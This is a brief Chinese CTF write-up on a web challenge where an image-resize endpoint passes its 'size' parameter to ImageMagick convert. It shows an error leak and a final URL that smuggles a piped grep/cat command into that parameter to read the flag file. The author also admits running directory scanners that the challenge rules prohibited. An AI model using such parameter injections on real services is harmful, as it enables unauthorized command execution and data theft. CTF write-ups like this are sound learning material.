感觉自己做的时间长后会学到很多trick

题目中的DIRBUSTER or any similar tools are NOT allowed. 被自己理解成了可以暴力扫目录、于是用dirsearch和御剑扫了一年、自己的英语水平太垃圾了

然后开始审计！

发现一个url 

```
http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=house&size=300x494
```

然后size修改一下会报错

```
Server: SimpleHTTP/0.6 Python/3.10.14
Date: Fri, 26 Apr 2024 07:06:00 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 566

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 500</p>
        <p>Message: Error resizing image: convert-im6.q16: invalid argument for option `-resize': 300x=! @ error/convert.c/ConvertImageCommand/2563.
.</p>
        <p>Error code explanation: 500 - Server got itself in trouble.</p>
    </body>
</html>
```

然后预期中的命令执行是这样

```
convert bbb.png -resize 200×200! bbb.png
```

开始构造命令注入

然后构造exp

拿到命令执行后找了n年flag的位置

怎么不直接放在/flag

下次直接grep搜了

```
http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=house&size= | cat $(grep -ri  'UMASS{.*}'  ../../..) 
```

然后即可获取flag

感觉命令行注入总是会藏在意想不到的位置